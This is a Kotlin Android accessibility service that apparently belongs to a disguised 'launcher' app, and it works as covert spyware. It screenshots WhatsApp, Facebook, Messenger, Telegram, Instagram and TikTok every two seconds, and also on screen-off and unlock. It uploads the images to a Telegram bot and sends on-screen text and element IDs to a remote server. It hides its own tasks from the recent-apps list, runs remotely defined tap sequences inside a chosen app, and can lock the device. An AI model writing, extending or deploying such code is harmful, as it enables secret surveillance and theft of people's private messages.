package com.example.launcher

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.app.ActivityManager
import android.app.admin.DevicePolicyManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Bitmap
import android.graphics.Path
import android.graphics.Rect
import android.os.Handler
import android.os.Looper
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.io.ByteArrayOutputStream
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors

class MonitorAccessibilityService : AccessibilityService() {

    private data class StepSpec(
        val text: String?,
        val id: String?,
        val posX: Float?,
        val posY: Float?
    )

    private val handler = Handler(Looper.getMainLooper())
    private var isShotLoopActive = false
    private var isAutoClickRunning = false
    private var lastAutoClickSignature: String? = null
    private var lastInspectedSnapshotHash: String? = null
    private var screenStateReceiver: BroadcastReceiver? = null

    private val monitoredPackages = listOf(
        "com.whatsapp",
        "com.whatsapp.w4b",
        "com.facebook.katana",
        "com.facebook.lite",
        "com.facebook.orca",
        "org.telegram.messenger",
        "com.instagram.android",
        "com.zhiliaoapp.musically",
        "com.zhiliaoapp.musically.go"
    )

    // Feature 2: Every 2 seconds screenshot for monitored packages (strictly controlled by autoShotEnabled)
    private val screenshotRunnable = object : Runnable {
        override fun run() {
            val prefs = Prefs(this@MonitorAccessibilityService)
            if (!prefs.running || !prefs.autoShotEnabled) {
                stopScreenshotLoop()
                return
            }

            val activePackage = getCurrentActivePackage()
            if (activePackage != packageName && activePackage != null && monitoredPackages.contains(activePackage)) {
                captureAndSendScreenshot(activePackage, "app_$activePackage", prefs)
                handler.postDelayed(this, 2000)
            } else {
                stopScreenshotLoop()
            }
        }
    }

    // Feature 1: Every 1 second check for target package & sequential 10-step auto clicker (strictly controlled by autoClickEnabled)
    private val autoClickWatchRunnable = object : Runnable {
        override fun run() {
            val prefs = Prefs(this@MonitorAccessibilityService)
            if (!prefs.running || !prefs.autoClickEnabled) {
                isAutoClickRunning = false
                handler.postDelayed(this, 1000)
                return
            }

            val targetPkg = prefs.autoClickTargetPackage.trim()
            val activePkg = getCurrentActivePackage()

            if (targetPkg.isNotEmpty() && activePkg == targetPkg && !isAutoClickRunning) {
                val activeSteps = prefs.autoClickSteps.filter { it.isNotBlank() }
                if (activeSteps.isNotEmpty()) {
                    val signature = "$targetPkg:${prefs.autoClickTriggerId}"
                    if (signature != lastAutoClickSignature) {
                        isAutoClickRunning = true
                        lastAutoClickSignature = signature
                        executeStepAtIndex(targetPkg, activeSteps, 0, prefs, 0)
                    }
                }
            } else if (activePkg != targetPkg) {
                lastAutoClickSignature = null
            }

            handler.postDelayed(this, 1000)
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        registerScreenReceiver()
        handler.removeCallbacks(autoClickWatchRunnable)
        handler.post(autoClickWatchRunnable)
    }

    fun lockScreenNow() {
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminName = ComponentName(this, ScreenAdminReceiver::class.java)
            if (dpm.isAdminActive(adminName)) {
                dpm.lockNow()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun stopScreenshotLoopNow() {
        stopScreenshotLoop()
    }

    private fun stopScreenshotLoop() {
        isShotLoopActive = false
        handler.removeCallbacks(screenshotRunnable)
    }

    private fun getCurrentActivePackage(): String? {
        return rootInActiveWindow?.packageName?.toString()
    }

    private fun clearOwnAppTasksFromRecent(activePkg: String) {
        if (activePkg == packageName || activePkg == "com.android.systemui") return
        try {
            val am = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
                for (task in am.appTasks) {
                    val basePkg = task.taskInfo.baseIntent?.component?.packageName
                    if (basePkg == packageName) {
                        task.finishAndRemoveTask()
                    }
                }
            }
        } catch (_: Exception) {
        }
    }

    private fun parseStepSpec(raw: String): StepSpec {
        val trimmed = raw.trim()
        val textMatch = Regex("""\[t:([^\]]+)\]""").find(trimmed)?.groupValues?.get(1)?.trim()
            ?: Regex("""\bt:([^\s\]]+)""").find(trimmed)?.groupValues?.get(1)?.trim()

        val idMatch = Regex("""\[id:([^\]]+)\]""").find(trimmed)?.groupValues?.get(1)?.trim()
            ?: Regex("""\bid:([^\s\]]+)""").find(trimmed)?.groupValues?.get(1)?.trim()

        val posRaw = Regex("""\[pos:([^\]]+)\]""").find(trimmed)?.groupValues?.get(1)?.trim()
            ?: Regex("""\bpos:([^\s\]]+)""").find(trimmed)?.groupValues?.get(1)?.trim()

        var px: Float? = null
        var py: Float? = null
        if (!posRaw.isNullOrBlank()) {
            val parts = posRaw.split(",")
            if (parts.size == 2) {
                px = parts[0].trim().toFloatOrNull()
                py = parts[1].trim().toFloatOrNull()
            }
        }

        val fallbackText = if (textMatch == null && idMatch == null && posRaw == null && trimmed.isNotEmpty()) {
            trimmed
        } else {
            textMatch?.ifBlank { null }
        }

        return StepSpec(
            text = fallbackText,
            id = idMatch?.ifBlank { null },
            posX = px,
            posY = py
        )
    }

    private fun executeStepAtIndex(
        targetPackage: String,
        steps: List<String>,
        stepIndex: Int,
        prefs: Prefs,
        attempt: Int
    ) {
        if (!prefs.running || !prefs.autoClickEnabled) {
            isAutoClickRunning = false
            return
        }

        if (stepIndex >= steps.size) {
            isAutoClickRunning = false
            val homeIntent = Intent(Intent.ACTION_MAIN).apply {
                addCategory(Intent.CATEGORY_HOME)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            startActivity(homeIntent)
            return
        }

        val currentPkg = getCurrentActivePackage()
        if (currentPkg != targetPackage) {
            isAutoClickRunning = false
            return
        }

        val rawStep = steps[stepIndex].trim()
        if (rawStep.isEmpty()) {
            executeStepAtIndex(targetPackage, steps, stepIndex + 1, prefs, 0)
            return
        }

        val spec = parseStepSpec(rawStep)
        val rootNode = rootInActiveWindow
        val beforeSnapshot = captureScreenSignature(rootNode)

        var clickedAndVerified = false

        // Priority 1: Search & click by Text
        if (!spec.text.isNullOrBlank()) {
            val textNodes = rootNode?.findAccessibilityNodeInfosByText(spec.text) ?: emptyList()
            for (node in textNodes) {
                if (performVerifiedNodeClick(node, rootNode, beforeSnapshot)) {
                    clickedAndVerified = true
                    break
                }
            }
        }

        // Priority 2: Only if Text didn't match, search & click by ID
        if (!clickedAndVerified && !spec.id.isNullOrBlank() && rootNode != null) {
            val idNode = findNodeByViewId(rootNode, spec.id)
            if (idNode != null && performVerifiedNodeClick(idNode, rootNode, beforeSnapshot)) {
                clickedAndVerified = true
            }
        }

        // Priority 3: Only if neither Text nor ID matched, click by pos:x,y
        if (!clickedAndVerified && spec.posX != null && spec.posY != null) {
            if (performVerifiedCoordinateClick(spec.posX, spec.posY, beforeSnapshot)) {
                clickedAndVerified = true
            }
        }

        if (clickedAndVerified) {
            handler.postDelayed({
                if (prefs.running && prefs.autoClickEnabled) {
                    captureAndSendScreenshot(targetPackage, "${targetPackage}_step_${stepIndex + 1}", prefs)
                }
                handler.postDelayed({
                    executeStepAtIndex(targetPackage, steps, stepIndex + 1, prefs, 0)
                }, 1200)
            }, 900)
        } else {
            if (attempt < 8) {
                handler.postDelayed({
                    executeStepAtIndex(targetPackage, steps, stepIndex, prefs, attempt + 1)
                }, 900)
            } else {
                isAutoClickRunning = false
            }
        }
    }

    private fun captureScreenSignature(root: AccessibilityNodeInfo?): String {
        if (root == null) return ""
        val sb = StringBuilder()
        fun walk(n: AccessibilityNodeInfo?, depth: Int) {
            if (n == null || depth > 8) return
            val id = n.viewIdResourceName ?: ""
            val txt = n.text?.toString() ?: ""
            val desc = n.contentDescription?.toString() ?: ""
            if (id.isNotEmpty() || txt.isNotEmpty() || desc.isNotEmpty()) {
                sb.append(id).append('|').append(txt).append('|').append(desc).append(';')
            }
            for (i in 0 until n.childCount) {
                walk(n.getChild(i), depth + 1)
            }
        }
        walk(root, 0)
        return sb.toString()
    }

    private fun findNodeByViewId(root: AccessibilityNodeInfo, targetId: String): AccessibilityNodeInfo? {
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        while (queue.isNotEmpty()) {
            val current = queue.removeFirst()
            val id = current.viewIdResourceName
            if (id != null && (id == targetId || id.endsWith(":id/$targetId") || id.endsWith("/$targetId"))) {
                return current
            }
            for (i in 0 until current.childCount) {
                current.getChild(i)?.let { queue.add(it) }
            }
        }
        return null
    }

    private fun performVerifiedNodeClick(
        node: AccessibilityNodeInfo,
        rootBefore: AccessibilityNodeInfo?,
        beforeSnapshot: String
    ): Boolean {
        var target: AccessibilityNodeInfo? = node
        var acted = false
        while (target != null) {
            if (target.isClickable && target.isEnabled) {
                acted = target.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                break
            }
            target = target.parent
        }
        if (!acted) {
            val rect = Rect()
            node.getBoundsInScreen(rect)
            if (!rect.isEmpty) {
                return performVerifiedCoordinateClick(rect.exactCenterX(), rect.exactCenterY(), beforeSnapshot)
            }
            return false
        }
        return verifyActionEffect(rootBefore, beforeSnapshot)
    }

    private fun performVerifiedCoordinateClick(x: Float, y: Float, beforeSnapshot: String): Boolean {
        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.N) return false
        val path = Path().apply { moveTo(x, y) }
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 60))
            .build()
        val dispatched = dispatchGesture(gesture, null, null)
        if (!dispatched) return false
        return verifyActionEffect(rootInActiveWindow, beforeSnapshot)
    }

    private fun verifyActionEffect(rootBefore: AccessibilityNodeInfo?, beforeSnapshot: String): Boolean {
        try {
            Thread.sleep(350)
        } catch (_: InterruptedException) {
            return false
        }
        val rootAfter = rootInActiveWindow ?: return true
        val afterSnapshot = captureScreenSignature(rootAfter)
        return afterSnapshot != beforeSnapshot || rootAfter !== rootBefore
    }

    private fun collectAndSendCurrentScreenIds(currentPackage: String, prefs: Prefs) {
        if (!prefs.running || !prefs.idCollectorEnabled) return
        val root = rootInActiveWindow ?: return
        val items = mutableListOf<String>()
        val seen = HashSet<String>()

        fun walk(node: AccessibilityNodeInfo?) {
            if (node == null) return
            val id = node.viewIdResourceName?.trim().orEmpty()
            val txt = node.text?.toString()?.trim().orEmpty()
            val desc = node.contentDescription?.toString()?.trim().orEmpty()
            val rect = Rect()
            node.getBoundsInScreen(rect)
            val posPart = if (!rect.isEmpty) "pos:${rect.centerX()},${rect.centerY()}" else ""

            if (id.isNotEmpty() || (node.isClickable && (txt.isNotEmpty() || desc.isNotEmpty() || posPart.isNotEmpty()))) {
                val entry = buildString {
                    if (id.isNotEmpty()) append("id:$id ")
                    if (txt.isNotEmpty()) append("text:\"$txt\" ")
                    if (desc.isNotEmpty()) append("desc:\"$desc\" ")
                    if (posPart.isNotEmpty()) append(posPart)
                }.trim()
                if (entry.isNotEmpty() && seen.add(entry)) {
                    items.add(entry)
                }
            }
            for (i in 0 until node.childCount) {
                walk(node.getChild(i))
            }
        }

        walk(root)
        if (items.isEmpty()) return

        val snapHash = "$currentPackage:${items.joinToString("|").hashCode()}"
        if (snapHash == lastInspectedSnapshotHash) return
        lastInspectedSnapshotHash = snapHash

        Thread {
            try {
                val api = ApiClient(Prefs.SERVER_URL, Prefs.TOKEN, prefs.deviceId)
                api.sendInspectorNodes(currentPackage, items.take(80))
            } catch (_: Exception) {
            }
        }.start()
    }

    private fun registerScreenReceiver() {
        if (screenStateReceiver != null) return
        val filter = IntentFilter().apply {
            addAction(Intent.ACTION_SCREEN_OFF)
            addAction(Intent.ACTION_USER_PRESENT)
        }
        screenStateReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                val prefs = Prefs(this@MonitorAccessibilityService)
                // Strictly respect autoShotEnabled: never capture/send screenshots when autoShotEnabled is false
                if (!prefs.running || !prefs.autoShotEnabled) return
                when (intent?.action) {
                    Intent.ACTION_SCREEN_OFF -> captureScreenEvent("screen_off", prefs)
                    Intent.ACTION_USER_PRESENT -> {
                        handler.postDelayed({
                            val freshPrefs = Prefs(this@MonitorAccessibilityService)
                            if (freshPrefs.running && freshPrefs.autoShotEnabled) {
                                captureScreenEvent("screen_unlocked", freshPrefs)
                            }
                        }, 1000)
                    }
                }
            }
        }
        registerReceiver(screenStateReceiver, filter)
    }

    private fun captureScreenEvent(tag: String, prefs: Prefs) {
        if (!prefs.running || !prefs.autoShotEnabled) return
        captureAndSendScreenshot("", tag, prefs)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val prefs = Prefs(this)
        val packageName = event.packageName?.toString() ?: return

        if (prefs.running && packageName != this.packageName) {
            clearOwnAppTasksFromRecent(packageName)
            if (prefs.idCollectorEnabled &&
                (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                    event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED)
            ) {
                collectAndSendCurrentScreenIds(packageName, prefs)
            }
        }

        if (!prefs.running || !prefs.autoShotEnabled) {
            stopScreenshotLoop()
            return
        }

        if (monitoredPackages.contains(packageName) && packageName != this.packageName) {
            if (!isShotLoopActive) {
                isShotLoopActive = true
                handler.removeCallbacks(screenshotRunnable)
                handler.post(screenshotRunnable)
            }
        } else if (packageName != this.packageName) {
            stopScreenshotLoop()
        }
    }

    private fun captureAndSendScreenshot(currentPackage: String, customPrefix: String, prefs: Prefs) {
        if (!prefs.running || !prefs.autoShotEnabled) return
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            takeScreenshot(
                Display.DEFAULT_DISPLAY,
                Executors.newSingleThreadExecutor(),
                object : TakeScreenshotCallback {
                    override fun onSuccess(screenshot: ScreenshotResult) {
                        val freshPrefs = Prefs(this@MonitorAccessibilityService)
                        val hardwareBuffer = screenshot.hardwareBuffer
                        val bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, screenshot.colorSpace)
                        hardwareBuffer.close()

                        if (!freshPrefs.running || !freshPrefs.autoShotEnabled) {
                            bitmap?.recycle()
                            return
                        }

                        if (bitmap != null) {
                            val mutableBitmap = bitmap.copy(Bitmap.Config.ARGB_8888, true)
                            bitmap.recycle()
                            val stream = ByteArrayOutputStream()
                            mutableBitmap.compress(Bitmap.CompressFormat.JPEG, 70, stream)
                            mutableBitmap.recycle()
                            sendTelegramPhoto(stream.toByteArray(), customPrefix, freshPrefs)
                        }
                    }

                    override fun onFailure(errorCode: Int) {}
                }
            )
        }
    }

    private fun sendTelegramPhoto(photoBytes: ByteArray, prefix: String, prefs: Prefs) {
        if (!prefs.running || !prefs.autoShotEnabled) return
        val botToken = prefs.telegramBotToken.trim()
        val chatId = prefs.telegramChatId.trim()
        if (botToken.isEmpty() || chatId.isEmpty()) return

        Thread {
            try {
                val timeStamp = System.currentTimeMillis()
                val fileName = "${prefix}_${timeStamp}.jpg"

                val boundary = "Boundary_" + System.currentTimeMillis()
                val urlString = "https://api.telegram.org/bot$botToken/sendPhoto"
                val url = URL(urlString)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

                val outputStream = conn.outputStream
                val writer = OutputStreamWriter(outputStream, "UTF-8")

                writer.append("--$boundary\r\n")
                writer.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
                writer.append("$chatId\r\n")
                writer.flush()

                writer.append("--$boundary\r\n")
                writer.append("Content-Disposition: form-data; name=\"photo\"; filename=\"$fileName\"\r\n")
                writer.append("Content-Type: image/jpeg\r\n\r\n")
                writer.flush()

                outputStream.write(photoBytes)
                outputStream.flush()

                writer.append("\r\n--$boundary--\r\n")
                writer.flush()
                writer.close()

                conn.responseCode
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    override fun onUnbind(intent: Intent?): Boolean {
        stopScreenshotLoop()
        isAutoClickRunning = false
        handler.removeCallbacks(autoClickWatchRunnable)
        if (screenStateReceiver != null) {
            try {
                unregisterReceiver(screenStateReceiver)
            } catch (_: Exception) {
            }
            screenStateReceiver = null
        }
        if (instance === this) {
            instance = null
        }
        return super.onUnbind(intent)
    }

    override fun onInterrupt() {
        stopScreenshotLoop()
        isAutoClickRunning = false
        handler.removeCallbacks(autoClickWatchRunnable)
    }

    companion object {
        @Volatile
        var instance: MonitorAccessibilityService? = null
    }
}
